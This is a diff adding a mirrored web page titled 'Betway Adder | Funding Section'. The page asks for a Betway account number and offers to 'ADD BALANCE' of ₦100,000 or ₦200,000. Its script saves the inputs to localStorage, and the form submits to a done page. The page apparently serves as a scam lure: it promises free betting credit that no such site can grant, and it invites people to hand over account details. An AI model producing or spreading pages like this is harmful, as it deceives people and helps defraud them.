@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from betway-plus.netlify.app/result.htm by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 29 May 2023 11:40:07 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="unnamed.html">
+    <script src="../ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="../kit.fontawesome.com/32bbba991c.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="style.css">
+    <title>Betway Adder | Funding Section</title>
+    <script>
+        function passvalue(){
+            var Phone=document.getElementById("Phone").value;
+            localStorage.setItem("textvalue", Phone);
+
+            var amount=document.getElementById("amount").value;
+            localStorage.setItem("textmiddle", amount);
+
+        }
+    </script>
+<style>
+body {
+  background-color: whitesmoke;
+}
+input {
+  width: 300px;
+  height: 40px;
+  border-radius: 10px;
+  border: 1px solid green;
+  font-family: 'Times New Roman', Times, serif;
+  outline: none;
+  box-shadow: 00 1px black;
+  color: black;
+}
+
+.input {
+  width: 310px;
+  height: 40px;
+  border-radius: 10px;
+  border: 1px solid green;
+  font-family: 'Times New Roman', Times, serif;
+  outline: none;
+  box-shadow: 00 1px black;
+  color: black;
+  cursor: pointer;
+}
+input:focus {
+  outline: none;
+  border: 1px solid green;
+  box-shadow:  0 0 5px #000;
+}
+    </style>
+</head>
+<body>
+    <br>
+      <h3 style="text-align: center; color: green;">Welcome!</h3>
+      <br>
+      <center>
+      <form class="form" method="get" action="done.html">
+        <input type="tel" placeholder="Betway Account Number" class="form--input" id="Phone" name="Phone" required>
+        <br>
+        <br>
+        <input type="tel" placeholder="Confirm Betway Account Number" class="form--input" id="Phone" name="Phone" required>
+        <br>
+        <br>
+        <select class="input" required id="amount" name="amount">
+            <option value="">--Select an amount--</option>
+            <option value="₦100,000.00">₦100,000.00</option>
+            <option value="₦200,000.00">₦200,000.00</option>
+            
+        </select>
+        <br>
+        <br>
+        <button onclick="passvalue();" class="input" style="background-color: green; color: white; font-weight: bold;">ADD BALANCE</button>
+    </form>
+</center>
+</body>
+
+<!-- Mirrored from betway-plus.netlify.app/result.htm by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 29 May 2023 11:40:11 GMT -->
+</html>
